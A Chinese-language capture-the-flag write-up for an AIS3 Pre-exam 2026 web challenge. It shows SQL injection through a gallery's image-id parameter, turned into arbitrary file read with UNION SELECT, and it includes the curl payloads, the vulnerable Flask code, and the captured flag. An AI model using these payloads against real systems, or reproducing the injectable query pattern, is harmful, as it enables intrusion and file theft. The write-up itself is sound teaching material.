---
title: "AIS3 Pre-exam 2026 - MyGO!!!!! X Ave Mujica 圖庫"
date: "2026-05-18 00:00:00 +0800"
categories: ["CTF Write-ups"]
tags: ["ctf", "ais3-pre-exam-2026", "web"]
description: "從圖庫的 image id 注入點出發，利用 SQL injection 還原資料與 flag。"
toc: true
source_url: "https://hackmd.io/IS77geEeQr2DdlQFfkS0WQ"
source_tag: "AIS3_Pre_exam 2026"
---

> 原始筆記：[HackMD](https://hackmd.io/IS77geEeQr2DdlQFfkS0WQ) · 比賽：AIS3 Pre-exam 2026

{% raw %}
> Category: Web 

---

這題是一個很典型的 Web 題：表面上看起來像是圖片上傳，實際上真正的洞在圖片讀取功能。

首頁是一個簡單的圖庫站，會顯示幾張圖片，並提供上傳功能。前端 JavaScript 可以看到圖片是透過 `/image?id=<id>` 載入，而上傳則是 `POST /upload`。

![image](/assets/img/writeups/H1DOI4d1Ge.png)

一開始先做最基本的 recon：

- `/`：首頁
- `/upload`：上傳圖片
- `/image?id=1`：讀取圖片
- `/robots.txt`：內容只有 `.svn`

`robots.txt` 這個提示很可疑，不過先不急著碰 `.svn`，先看比較像主要漏洞的 `/image?id=`。

## Step 1. 測試 `/image?id=` 是否可注入

我先試了幾個異常參數，發現行為很不自然：

- `id=1` 會正常回圖
- `id=9999` 直接 `500`
- `id=abc` 直接 `500`
- `id=1 and 1=1` 會正常回圖
- `id=1 and 1=2` 直接 `500`

用 `and 1=1 / and 1=2` 這組 payload 幾乎可以直接確認有 SQL injection。

```bash
curl "http://chals1.ais3.org:48763/image?id=1%20and%201=1"
curl "http://chals1.ais3.org:48763/image?id=1%20and%201=2"
```


前者正常，後者噴 `500`，代表後端很可能把 `id` 直接拼進 SQL。

## Step 2. 用 UNION 讀 source code

既然是 SQL injection，下一步就是想辦法控制查詢結果。

後來測到這個 payload 可以成功：

```bash
curl "http://chals1.ais3.org:48763/image?id=0%20union%20select%20'app.py'"
```


結果真的把 `app.py` 當檔案送回來。看到 source 之後，整題就很清楚了：

![image](/assets/img/writeups/HkZU_4d1fe.png)

```python
@app.get("/image")
def image():
    image_id = request.args.get("id")
    cur = db.execute(f"SELECT path FROM images WHERE id = {image_id};").fetchone()
    return send_file(cur[0])
```


這裡有兩個重點：

1. `image_id` 直接被拼進 SQL，造成 SQL injection
2. 查詢結果的 `path` 會直接丟進 `send_file()`，所以只要能控制 `SELECT path` 的結果，就能讀任意檔案

也就是說，這題本質上是：

- SQL injection
- 再加上一個 `send_file(cur[0])` 造成的 arbitrary file read

## Step 3. 確認資料表結構

從 source 可以直接看到資料表結構：

```python
db.execute("CREATE TABLE images (id INTEGER PRIMARY KEY, path TEXT);")
```


所以 `/image` 這支 API 實際上只需要查出一個欄位：`path`。

也難怪下面這種 payload 會成功：

```bash
curl "http://chals1.ais3.org:48763/image?id=0%20union%20select%20'images/good.jpg'"
```


因為它會等價於：

```sql
SELECT path FROM images WHERE id = 0
UNION
SELECT 'images/good.jpg';
```


最後 `send_file()` 就會去讀 `images/good.jpg`。

## Step 4. 利用 `.svn` 提示找隱藏檔名

雖然理論上已經能任意讀檔，但 flag 檔名還不知道。這時候回頭看 `robots.txt` 的 `.svn` 提示就很合理了。

直接讀 `.svn/wc.db`：

```bash
curl "http://chals1.ais3.org:48763/image?id=0%20union%20select%20'.svn/wc.db'" -o wc.db
```


這是 SVN working copy 的 SQLite 資料庫，裡面會記錄工作目錄中的檔案。

接著在本機查詢：

```bash
sqlite3 wc.db "select local_relpath, kind from nodes where op_depth=0 order by local_relpath;"
```


可以看到類似這樣的結果：

```text
app.py
images/good.jpg
images/haruhikage.jpg
images/useless.jpg
images/yes_but_no.jpg
requirements.txt
robots.txt
static/style.css
super_secret_starburst_flag114514.txt
templates/index.html
```


重點就是這個很像 flag 的檔名：

```text
super_secret_starburst_flag114514.txt
```


## Step 5. 直接讀 flag

既然已經知道檔名，直接用同一招讀出來：

```bash
curl "http://chals1.ais3.org:48763/image?id=0%20union%20select%20'super_secret_starburst_flag114514.txt'"
```


成功拿到 flag：

```text
AIS3{BangDream_AveMujica_Exitus_at_Taiwan_8/8_and_I_don't_have_ticket}
```


## Exploit Chain 總結

這題的利用鏈很乾淨：

1. 觀察 `/image?id=` 的異常行為，確認 SQL injection
2. 用 `UNION SELECT` 控制查詢結果
3. 利用 `send_file(cur[0])` 把查詢結果當成檔案路徑讀出
4. 先讀 `app.py` 確認漏洞型態
5. 再讀 `.svn/wc.db` 枚舉工作目錄檔案
6. 找到隱藏 flag 檔名後直接讀出 flag

## Flag

```text
AIS3{BangDream_AveMujica_Exitus_at_Taiwan_8/8_and_I_don't_have_ticket}
```
{% endraw %}
